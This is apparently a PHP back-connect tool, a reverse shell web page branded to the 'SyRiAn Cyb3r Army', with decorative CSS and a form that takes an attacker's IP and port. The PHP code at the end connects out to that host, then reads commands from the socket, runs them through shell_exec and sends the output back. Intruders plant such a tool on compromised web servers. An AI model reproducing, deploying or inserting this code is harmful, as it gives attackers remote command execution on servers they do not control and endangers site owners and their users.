
<html>
<head>
<title>SEA | PHP Back Connection .</title>
<link rel="shortcut icon" href='http://sea.sy/style/css/images/sea_en.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>

<style type="text/css">

.neon{
	color:blue;
	text-shadow: 0 0 5px red,0 0 10px red, 0 0 30px orange, 0 0 45px yellow, 0 0 60px red;
	}
.neon2{
	font-size:15px;
	color:lime;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.neon3{
	color:yellow;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.hacking{
	position:absolute;
	left:50px; font-size:35px;
	}
.like{
	border:4px double yellow;
	box-shadow:0px 2px 20px white;
	border-radius:10px;
	padding:9px;
	height:310px;}
	img{border:4px double yellow;
	box-shadow:0px 9px 15px white;
	border-radius:10px;
	opacity:0.75;
	-moz-opacity: 0.75;
	filter: alpha(opacity=75);
	}
a {
	text-decoration:none;}

</style>
<style>

@-webkit-keyframes tremer {
	0% {-webkit-transform: rotate(3deg);}
	50% {-webkit-transform: rotate(-3deg);}
	100% {-webkit-transform: rotate(3deg);}
	}
img:hover {
	-webkit-animation:tremer 0.2s linear infinite;
	-moz-animation:tremer 0.2s linear infinite;
	-o-animation:tremer 0.2s linear infinite;
	animation:tremer 0.2s linear infinite;
	}
</style>
<?php
$sh3llColor = "#0040FF";
function CSS($sh3llColor)
{
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #33363b;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#1C1C1C;
	font-weight:bold;
	width:500px;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #1C1C1C;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>";
	return $css;
}
echo CSS($sh3llColor)
?>
</head>
<!-- Back Connection -->
<center>
<p><img src="http://sea.sy/style/css/images/sea_en.png" height="200" width="400" style="height:200px;">	
<form enctype="multipart/form-data" method="POST">
  <table width='576' height='72' border='0' id='Box'><tr>
<td width='4%' height='21' style="background:<?php echo $sh3llColor; ?>">&nbsp;</td>
<td style='padding-left:10px;' >Back Connect PHP </td></tr><tr><td height='45' colspan='2'>
<input type="text" name="ip" value="127.0.0.1" />
<input type="text" name="port" value="443" />
<input type='submit' value='Connect Now' name='connectNow'>
</td></tr></table></form>
<!-- End Of Back Connection -->
</center>
<center>
<?php
# --------------------------
#   Back Connection PHP
#---------------------------
if($_POST['connectNow'])
{
	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	if($sock < 0){echo "<sy>[-] failed to create socket.</sy>";}
	else
	{
		$result = socket_connect($sock, filter(trim($_POST['ip'])), filter(trim($_POST['port'])));
		if($result < 0){echo "<sy>[-] failed to connect back to host:".$_GET['host']."</sy>";}
		else
		{
			$send_var = "\n\n -== SyRiAn Cyb3r Army , Back Connection ==-\n$";
			socket_write($sock, $send_var, strlen($send_var));
			while($input = socket_read($sock, 10000))
			{
				socket_write($sock, shell_exec($input), 12000);
			}
		}
	}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">
	<center><font color="gray" size="-2"><b>
	<font color="gray"></font><sy>   [
	</sy><font color="gray"></div><a href="http://www.sea.sy" target="_blank">www.sea.sy</a></font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	</body></html>
	';
}
footer();
?>
